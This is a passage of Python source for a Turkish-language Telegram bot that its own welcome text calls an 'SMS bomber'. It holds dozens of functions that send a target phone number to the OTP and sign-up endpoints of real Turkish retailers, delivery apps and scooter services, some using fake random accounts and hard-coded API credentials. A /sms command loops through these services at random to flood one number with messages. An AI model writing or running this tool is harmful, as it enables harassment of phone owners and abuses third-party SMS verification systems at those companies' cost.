        r1 = r.json()["isSucceed"]

        if r1:
            return True, "İkinci Yeni"
        else:
            return False, "İkinci Yeni"
    except:
        return False, "İkinci Yeni"

def migros(number):
    try:
        url = "https://www.migros.com.tr/rest/users/login/otp"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]

        if r1 == True:
            return True, "Migros"
        else:
            return False, "Migros"
    except:
        return False, "Migros"

def ceptesok(number):
    try:
        url = "https://api.ceptesok.com/api/users/sendsms"
        payload = {
            "mobile_number": f"{number}",
            "token_type": "register_token"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Cepte Şok"
        else:
            return False, "Cepte Şok"
    except:
        return False, "Cepte Şok"



def tiklagelsin(number):
    try:
        url = "https://www.tiklagelsin.com/user/graphql"
        payload = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{number}",
                "challenge": str(uuid.uuid4()),
                "deviceUniqueId": f"web_{uuid.uuid4()}"
            },
            "query": """
            mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {
              generateOtp(
                phone: $phone
                challenge: $challenge
                deviceUniqueId: $deviceUniqueId
              )
            }
            """
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tıkla Gelsin"
        else:
            return False, "Tıkla Gelsin"
    except:
        return False, "Tıkla Gelsin"

def bisu(number):
    try:
        url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
        payload = {
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BiSU"
        else:
            return False, "BiSU"
    except:
        return False, "BiSU"

def file(number):
    try:
        url = "https://api.filemarket.com.tr/v1/otp/send"
        payload = {
            "mobilePhoneNumber": f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["data"]
        if r1 == "200 OK":
            return True, "File"
        else:
            return False, "File"
    except:
        return False, "File"

def ipragraz(number):
    try:
        url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
        payload = {
            "otp": "",
            "phoneNumber": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İpragaz"
        else:
            return False, "İpragaz"
    except:
        return False, "İpragaz"

def pisir(number):
    try:
        url = "https://api.pisir.com/v1/login/"
        payload = {"msisdn": f"90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["ok"]
        if r1 == "1":
            return True, "Pişir"
        else:
            return False, "Pişir"
    except:
        return False, "Pişir"

def coffy(number):
    try:
        url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
        payload = {"phoneNumber": f"+90{number}"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Coffy"
        else:
            return False, "Coffy"
    except:
        return False, "Coffy"

def sushico(number):
    try:
        url = "https://api.sushico.com.tr/tr/sendActivation"
        payload = {"phone": f"+90{number}", "location": 1, "locale": "tr"}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["err"]
        if r1 == 0:
            return True, "SushiCo"
        else:
            return False, "SushiCo"
    except:
        return False, "SushiCo"

def kalmasin(number):
    try:
        url = "https://api.kalmasin.com.tr/user/login"
        payload = {
            "dil": "tr",
            "device_id": "",
            "notification_mobile": "android-notificationid-will-be-added",
            "platform": "android",
            "version": "2.0.6",
            "login_type": 1,
            "telefon": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Kalmasın"
        else:
            return False, "Kalmasın"
    except:
        return False, "Kalmasın"

def yotto(number):
    try:
        url = "https://42577.smartomato.ru/account/session.json"
        payload = {
            "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 201:
            return True, "Yotto"
        else:
            return False, "Yotto"
    except:
        return False, "Yotto"

def qumpara(number):
    try:
        url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
        payload = {
            "msisdn" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Qumpara"
        else:
            return False, "Qumpara"
    except:
        return False, "Qumpara"

def aygaz(number):
    try:
        url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
        payload = {
            "Gsm" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Aygaz"
        else:
            return False, "Aygaz"
    except:
        return False, "Aygaz"

def pawapp(number):
    try:
        url = "https://api.pawder.app/api/authentication/sign-up"
        payload = {
            "languageId" : "2",
            "mobileInformation" : "",
            "data" : {
                "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
                "userAgreement" : "true",
                "kvkk" : "true",
                "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
                "phoneNo" : f"{number}",
                "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "PawAPP"
        else:
            return False, "PawAPP"
    except:
        return False, "PawAPP"

def mopas(number):
    try:
        url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
        r = requests.post(url=url, timeout=2)
        
        if r.status_code == 200:
            token = json.loads(r.text)["access_token"]
            token_type = json.loads(r.text)["token_type"]
            url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
            headers = {"authorization": f"{token_type} {token}"}
            r1 = requests.get(url=url, headers=headers, timeout=2)
            
            if r1.status_code == 200:
                return True, "Mopaş"
            else:
                return False, "Mopaş"
        else:
            return False, "Mopaş"
    except:
        return False, "Mopaş"

def paybol(number):
    try:
        url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"
        payload = {
            "otp_code" : "null",
            "phone_number" : f"90{number}",
            "reference_id" : "null"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        
        if r.status_code == 200:
            return True, "Paybol"
        else:
            return False, "Paybol"
    except:
        return False, "Paybol"

def ninewest(number):
    try:
        url = "https://www.ninewest.com.tr/webservice/v1/register.json"
        payload = {
            "alertMeWithEMail" : False,
            "alertMeWithSms" : False,
            "dataPermission" : True,
            "email" : "asdafwqww44wt4t4@gmail.com",
            "genderId" : random.randint(0,3),
            "hash" : "5488b0f6de",
            "inviteCode" : "",
            "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
            "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
            "registerContract" : True,
            "registerMethod" : "mail",
            "version" : "3"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        
        if r1 == True:
            return True, "Nine West"
        else:
            return False, "Nine West"
    except:
        return False, "Nine West"

def saka(number):
    try:
        url = "https://mobilcrm2.saka.com.tr/api/customer/login"
        payload = {
            "gsm" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == 1:
            return True, "Saka"
        else:
            return False, "Saka"
    except:
        return False, "Saka"

def superpedestrian(number):
    try:
        url = "https://consumer-auth.linkyour.city/consumer_auth/register"
        payload = {
            "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["detail"]
        if r1 == "Ok":
            return True, "Superpedestrian"
        else:
            return False, "Superpedestrian"
    except:
        return False, "Superpedestrian"

def hayat(number):
    try:
        url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"
        r = requests.post(url=url, timeout=5)
        r1 = json.loads(r.text)["IsSuccessful"]
        if r1 == True:
            return True, "Hayat"
        else:
            return False, "Hayat"
    except:
        return False, "Hayat"

def tazi(number):
    try:
        url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
        payload = {
            "cep_tel" : f"{number}",
            "cep_tel_ulkekod" : "90"
        }
        headers = {
            "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Tazı"
        else:
            return False, "Tazı"
    except:
        return False, "Tazı"

def gofody(number):
    try:
        url = "https://backend.gofody.com/api/v1/enduser/register/"
        payload = {
            "country_code": "90",
            "phone": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "GoFody"
        else:
            return False, "GoFody"
    except:
        return False, "GoFody"

def weescooter(number):
    try:
        url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
        payload = {
            "tenant": "62a1e7efe74a84ea61f0d588",
            "gsm": f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Wee Scooter"
        else:
            return False, "Wee Scooter"
    except:
        return False, "Wee Scooter"

def scooby(number):
    try:
        url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Scooby"
        else:
            return False, "Scooby"
    except:
        return False, "Scooby"

def gez(number):
    try:
        url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["succeeded"]
        if r1 == True:
            return True, "Gez"
        else:
            return False, "Gez"
    except:
        return False, "Gez"

def heyscooter(number):
    try:
        url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"
        headers = {"user-agent" : "okhttp/3.12.1"}
        r = requests.post(url=url, headers=headers, timeout=5)
        r1 = json.loads(r.text)["IsSuccess"]
        if r1 == True:
            return True, "Hey Scooter"
        else:
            return False, "Hey Scooter"
    except:
        return False, "Hey Scooter"

def jetle(number):
    try:
        url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"
        r = requests.get(url=url, timeout=5)
        if r.status_code == 200:
            return True, "Jetle"
        else:
            return False, "Jetle"
    except:
        return False, "Jetle"

def rabbit(number):
    try:
        url = "https://api.rbbt.com.tr/v1/auth/authenticate"
        payload = {
            "mobile_number" : f"+90{number}",
            "os_name" : "android",
            "os_version" : "7.1.2",
            "app_version" : " 1.0.2(12)",
            "push_id" : "-"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["status"]
        if r1 == True:
            return True, "Rabbit"
        else:
            return False, "Rabbit"
    except:
        return False, "Rabbit"

def roombadi(number):
    try:
        url = "https://api.roombadi.com/api/v1/auth/otp/authenticate"
        payload = {"phone": f"{number}", "countryId": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "Roombadi"
        else:
            return False, "Roombadi"
    except:
        return False, "Roombadi"

def hizliecza(number):
    try:
        url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"
        payload = {"phoneNumber": f"+90{number}", "otpOperationType": 2}
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Hızlı Ecza"
        else:
            return False, "Hızlı Ecza"
    except:
        return False, "Hızlı Ecza"

def signalall(number):
    try:
        url = "https://appservices.huzk.com/client/register"
        payload = {
            "name": "",
            "phone": {
                "number": f"{number}",
                "code": "90",
                "country_code": "TR",
                "name": ""
            },
            "countryCallingCode": "+90",
            "countryCode": "TR",
            "approved": True,
            "notifyType": 99,
            "favorites": [],
            "appKey": "live-exchange"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "SignalAll"
        else:
            return False, "SignalAll"
    except:
        return False, "SignalAll"

def goyakit(number):
    try:
        url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"
        r = requests.get(url=url, timeout=5)
        r1 = json.loads(r.text)["data"]["success"]
        if r1 == True:
            return True, "Go Yakıt"
        else:
            return False, "Go Yakıt"
    except:
        return False, "Go Yakıt"

def pinar(number):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"
        payload = {
            "MobilePhone" : f"{number}"
        }
        headers = {
            "devicetype" : "android",
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.text == True:
            return True, "Pınar"
        else:
            return False, "Pınar"
    except:
        return False, "Pınar"

def oliz(number):
    try:
        url = "https://api.oliz.com.tr/api/otp/send"
        payload = {
            "mobile_number" : f"{number}",
            "type" : None
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["meta"]["messages"]["success"][0]
        if r1 == "SUCCESS_SEND_SMS":
            return True, "Oliz"
        else:
            return False, "Oliz"
    except:
        return False, "Oliz"

def macrocenter(number):
    try:
        url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"
        payload = {
            "phoneNumber" : f"{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["successful"]
        if r1 == True:
            return True, "Macro Center"
        else:
            return False, "Macro Center"
    except:
        return False, "Macro Center"

def marti(number):
    try:
        url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"
        payload = {
            "mobilePhone" : f"{number}",
            "mobilePhoneCountryCode" : "90"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["isSuccess"]
        if r1 == True:
            return True, "Martı"
        else:
            return False, "Martı"
    except:
        return False, "Martı"

def karma(number):
    try:
        url = "https://api.gokarma.app/v1/auth/send-sms"
        payload = {
            "phoneNumber" : f"90{number}",
            "type" : "REGISTER",
            "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
            "language" : "tr-TR"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Karma"
        else:
            return False, "Karma"
    except:
        return False, "Karma"

def joker(number):
    try:
        url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
        payload = {
            "phone" : f"{number}"
        }
        headers = {
            "user-agent" : ""
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        r1 = json.loads(r.text)["success"]

        if r1 == True:
            return True, "Joker"
        else:
            return False, "Joker"
    except:
        return False, "Joker"

def hop(number):
    try:
        url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
        payload = {
            "phone" : f"+90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 201:
            return True, "Hop"
        else:
            return False, "Hop"
    except:
        return False, "Hop"

def kimgbister(number):
    try:
        url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
        payload = {
            "msisdn" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)

        if r.status_code == 200:
            return True, "Kim GB Ister"
        else:
            return False, "Kim GB Ister"
    except:
        return False, "Kim GB Ister"


def anadolu(number):
    try:
        url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"
        payload = urllib.parse.urlencode({
            "Numara": number  # Number should be a string of digits
        })
        headers = {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        r = requests.post(url=url, headers=headers, data=payload, timeout=5)
        if r.status_code == 200:
            return True, "Anadolu"
        else:
            return False, "Anadolu"
    except:
        return False, "Anadolu"

def total(number):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    try:
        url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"
        r = requests.post(url=url, verify=False, timeout=5)
        r1 = json.loads(r.text)["success"]
        if r1 == True:
            return True, "Total"
        else:
            return False, "Total"
    except:
        return False, "Total"

def englishhome(number):
    try:
        url = "https://www.englishhome.com:443/enh_app/users/registration/"
        payload = {
            "first_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "last_name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
            "phone": f"0{number}",
            "password": f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
            "email_allowed": False,
            "sms_allowed": False,
            "confirm": True,
            "tom_pay_allowed": True
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 202:
            return True, "English Home"
        else:
            return False, "English Home"
    except:
        return False, "English Home"

def petrolofisi(number):
    try:
        url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
        payload = {
            "approvedContractVersion": "v1",
            "approvedKvkkVersion": "v1",
            "contractPermission": True,
            "deviceId": "",
            "etkContactPermission": True,
            "kvkkPermission": True,
            "mobilePhone": f"0{number}",
            "name": f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
            "plate": f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
            "positiveCard": "",
            "referenceCode": "",
            "surname": f"{''.join(random.choices(string.ascii_lowercase, k=8))}"
        }
        headers = {
            "X-Channel": "IOS"
        }
        r = requests.post(url=url, headers=headers, json=payload, timeout=5)
        if r.status_code == 204:
            return True, "Petrol Ofisi"
        else:
            return False, "Petrol Ofisi"
    except:
        return False, "Petrol Ofisi"
        
import telebot
import random
import time
import urllib3

TOKEN = 'BURAYA_BOT_TOKEN'


services = {
    "KahveDunyasi": KahveDunyasi,
    "Wmf": Wmf,
    "Icq": Icq,
    "Suiste": Suiste,
    "Evidea": Evidea,
    "Ucdortbes": Ucdortbes,
    "Ayyildiz": Ayyildiz,
    "Naosstars": Naosstars,
    "Koton": Koton,
    "Metro": Metro,
    "Akasya": Akasya,
    "Akbati": Akbati,
    "Clickme": Clickme,
    "Happy": Happy,
    "Komagene": Komagene,
    "KuryemGelsin": KuryemGelsin,
    "Porty": Porty,
    "Taksim": Taksim,
    "Tasdelen": Tasdelen,
    "Tasimacim": Tasimacim,
    "ToptanTeslim": ToptanTeslim,
    "Uysal": Uysal,
    "Yapp": Yapp,
    "YilmazTicaret": YilmazTicaret,
    "Yuffi": Yuffi,
    "Beefull": Beefull,
    "Starbucks": Starbucks,
    "Dominos": Dominos,
    "Baydoner": Baydoner,
    "Pidem": Pidem,
    "Frink": Frink,
    "a101": a101,
    "bim": bim,
    "defacto": defacto,
    "istegelsin": istegelsin,
    "ikinciyeni": ikinciyeni,
    "migros": migros,
    "ceptesok": ceptesok,
    "tiklagelsin": tiklagelsin,
    "bisu": bisu,
    "file": file,
    "ipragraz": ipragraz,
    "pisir": pisir,
    "coffy": coffy,
    "sushico": sushico,
    "kalmasin": kalmasin,
    "yotto": yotto,
    "qumpara": qumpara,
    "aygaz": aygaz,
    "pawapp": pawapp,
    "mopas": mopas,
    "paybol": paybol,
    "ninewest": ninewest,
    "saka": saka,
    "superpedestrian": superpedestrian,
    "hayat": hayat,
    "tazi": tazi,
    "gofody": gofody,
    "weescooter": weescooter,
    "scooby": scooby,
    "gez": gez,
    "heyscooter": heyscooter,
    "jetle": jetle,
    "rabbit": rabbit,
    "roombadi": roombadi,
    "hizliecza": hizliecza,
    "signalall": signalall,
    "goyakit": goyakit,
    "pinar": pinar,
    "oliz": oliz,
    "macrocenter": macrocenter,
    "marti": marti,
    "karma": karma,
    "joker": joker,
    "hop": hop,
    "kimgbister": kimgbister,
    "anadolu": anadolu,
    "total": total,
    "englishhome": englishhome,
    "petrolofisi": petrolofisi,
}

bot = telebot.TeleBot(TOKEN)


@bot.message_handler(commands=['start'])
def botu_baslatma(message):
    bot.reply_to(message, "𝐌𝐄𝐑𝐇𝐀𝐁𝐀 𝐒𝐌𝐒 𝐁𝐎𝐌𝐁𝐄𝐑 𝐁𝐎𝐓𝐔𝐍𝐀 𝐇𝐎Ş𝐆𝐄𝐋𝐃İ𝐍İ𝐙, 𝐊𝐎𝐌𝐔𝐓𝐋𝐀𝐑 İÇİ𝐍 /𝐤𝐨𝐦𝐮𝐭.")

@bot.message_handler(commands=['komut'])
def send_help_message(message):
    bot.reply_to(message, """
/sms - Sms Spam İşlemi.
    """)


@bot.message_handler(commands=['sms'])
def send_sms(message):
    args = message.text.split()[1:]
    if len(args) != 2:
        bot.reply_to(message, "𝗞𝘂𝗹𝗹𝗮𝗻ı𝗺:\n\n/sms 𝟓𝟒𝟒𝟗𝟎𝟗𝐱𝐱 𝟐𝟓𝟎")
        return
    phone_number = args[0]
    sms_count = int(args[1])

    bot.reply_to(message, f"İŞLEM BAŞLATILDI!")

    for _ in range(sms_count):
        servis_adi = random.choice(list(services.keys()))
        service = services[servis_adi]
        service(phone_number)

    bot.reply_to(message, f"{sms_count} İSLEM TAMAMDIR ✓")

bot.polling()
